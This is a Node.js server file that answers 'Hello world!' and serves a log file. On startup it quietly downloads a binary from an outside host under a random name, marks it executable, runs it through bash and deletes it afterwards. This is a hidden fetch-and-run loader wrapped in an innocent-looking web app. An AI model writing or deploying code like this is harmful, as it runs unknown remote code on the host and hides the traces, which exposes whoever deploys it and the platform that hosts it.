const http = require("http");
const fs = require('fs');
const axios = require('axios');
const { exec } = require('child_process');
const PORT = process.env.PORT || 3000;
const SUB_PATH  =  process.env.SUB_PATH || 'log';

const server = http.createServer((req, res) => {
  if (req.url === '/') {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end("Hello world!");
  } 
  else if (req.url === `/${SUB_PATH}`) {
    fs.readFile("./.npm/log.txt", "utf8", (err, data) => {
      if (err) {
        console.error(err);
        res.writeHead(500, { 'Content-Type': 'text/plain' });
        res.end("Error reading log.txt");
      } else {
        res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
        res.end(data);
      }
    });
  }
});

const downloadFile = async () => {
  try {
    const url = "https://amd64.ssss.nyc.mn/glitch"
    const randomFileName = Math.random().toString(36).substring(2, 12);
    const response = await axios({
      method: 'get',
      url: url,
      responseType: 'stream'
    });

    const writer = fs.createWriteStream(randomFileName);
    response.data.pipe(writer);

    return new Promise((resolve, reject) => {
      writer.on('finish', () => {
        console.log(`${randomFileName} download completed`);
        exec(`chmod +x ${randomFileName}`, (err) => {
          if (err) reject(err);
          resolve(randomFileName);
        });
      });
      writer.on('error', reject);
    });
  } catch (err) {
    throw err;
  }
};

const Execute = async () => {
  try {
    const fileName = await downloadFile();
    const command = `./${fileName}`;
    exec(command, { 
      shell: '/bin/bash'
    }, () => {
      fs.unlink(fileName, () => {});
    });
  } catch (err) {
    console.error('Error executing command:', err);
  }
};

server.listen(PORT, () => {
  Execute();
  console.log(`Server is running on port:${PORT}`);
});